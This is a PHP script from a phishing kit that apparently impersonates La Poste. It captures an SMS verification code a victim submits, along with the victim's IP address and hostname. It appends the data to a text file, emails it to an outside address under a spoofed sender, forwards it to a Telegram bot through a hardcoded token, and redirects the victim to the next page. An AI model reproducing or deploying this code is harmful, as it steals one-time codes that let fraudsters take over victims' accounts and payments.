<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$date = date("H:i:s | d/m/Y");
$message .= "--------------------SPAWN  IT-------------------\n";
$message .= "CODE 2 OK 2        : ".$_POST['s8']."\n";
$message .= "---------------------- IT ; ----------------------\n";
$to = "ousafi@yahoo.com";
$subj = " SMS 2 ".$ip."\n";
$from = "From: LA POSTE <zabi3@a2plcpnl0176.prod.iad2.secureserver.net>";


/////////////////////////////////// file txt code ////////
$dt = "+++++++++++++++++++++++++++".$subj;
$nmsg = $dt.$message ;
$file = fopen("../9al.txt","a+") ;
fwrite($file, $nmsg."\n\n\n\n");
fclose($file);

/////////////////////////////////////////////////////////


mail($to, $subj, $message, $from);
header("Location:./lod3.php");
$token = "1220651941:AAGYicj2By8ztSFgPSHZBD5qPKHOXnNvVvM";
file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=809875026&text=" . urlencode($message)."" );

?>
